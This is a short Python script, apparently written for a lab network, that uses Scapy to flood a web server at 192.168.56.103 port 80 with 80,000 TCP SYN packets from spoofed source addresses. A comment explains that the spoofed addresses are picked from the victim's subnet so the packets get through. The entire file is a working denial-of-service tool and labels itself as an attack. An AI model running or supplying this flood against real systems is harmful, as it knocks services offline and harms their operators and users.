#!/usr/bin/env python3

from scapy.all import IP, TCP, send
import random

# Victim's IP and target port (Apache default port)
TARGET_IP = "192.168.56.103"
TARGET_PORT = 80

# Number of spoofed SYN packets to send
PACKET_COUNT = 80000

print(f"[+] Starting TCP SYN Flood with IP Spoofing on {TARGET_IP}:{TARGET_PORT}")
print(f"[+] Sending {PACKET_COUNT} spoofed SYN packets...\n")

for i in range(PACKET_COUNT):
    # Spoof IP from same subnet as victim to avoid silent drop
    spoofed_ip = f"192.168.56.{random.randint(1, 254)}"
    sport = random.randint(1024, 65535)
    seq = random.randint(0, 4294967295)

    ip = IP(src=spoofed_ip, dst=TARGET_IP)
    tcp = TCP(sport=sport, dport=TARGET_PORT, flags="S", seq=seq)
    pkt = ip / tcp

    send(pkt, verbose=0)

    if (i + 1) % 1000 == 0:
        print(f"[+] Sent {i + 1} packets")

print("\n[+] Attack completed.")
